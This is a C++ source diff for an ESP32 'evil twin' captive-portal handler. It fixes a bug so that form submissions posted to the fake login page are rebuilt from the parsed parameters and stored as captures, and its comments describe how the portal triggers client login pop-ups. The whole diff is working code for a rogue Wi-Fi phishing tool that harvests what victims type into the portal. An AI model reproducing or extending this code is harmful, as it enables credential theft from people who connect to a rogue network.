@@ -107,7 +107,14 @@ class PortalHandler : public AsyncWebHandler {
                 portalBodies.erase(it);
             }
         }
-        if (request->method() == HTTP_POST && !body.empty()) {
+        // An HTML form — exactly what the portal page posts — is
+        // `application/x-www-form-urlencoded`, and ESPAsyncWebServer diverts that
+        // content type into the request's parameter list instead of calling
+        // handleBody() (`_isPlainPost` in WebRequest.cpp). So a real submission
+        // arrives here with an empty accumulated body; without rebuilding it
+        // from the parsed params every capture is dropped and `captures` stays 0.
+        if (request->method() == HTTP_POST && body.empty()) body = formBodyFromParams(request);
+        if (request->method() == HTTP_POST && !body.empty() && body.size() <= kPortalMaxBodyBytes) {
             std::lock_guard<std::mutex> lock(portalMutex);
             PortalCapture &slot = portalQueue[portalQueueHead];
             slot.body = std::move(body);
@@ -119,6 +126,22 @@ class PortalHandler : public AsyncWebHandler {
     }
 
   private:
+    // Rebuilds `a=1&b=2` from the POST parameters the form parser produced.
+    static std::string formBodyFromParams(AsyncWebServerRequest *request) {
+        std::string body;
+        const size_t count = request->params();
+        for (size_t i = 0; i < count; ++i) {
+            const AsyncWebParameter *param = request->getParam(i);
+            if (param == nullptr || !param->isPost() || param->isFile()) continue;
+            const String &name = param->name();
+            const String &value = param->value();
+            evilTwin::appendFormPair(body, std::string_view(name.c_str(), name.length()),
+                                     std::string_view(value.c_str(), value.length()));
+            if (body.size() > kPortalMaxBodyBytes) return {}; // bounded like handleBody
+        }
+        return body;
+    }
+
     // OS captive probes get a redirect to the portal root instead of the page
     // body: that is what a real "signed in" network answers, and it is what
     // makes the client pop the login page rather than silently accept the
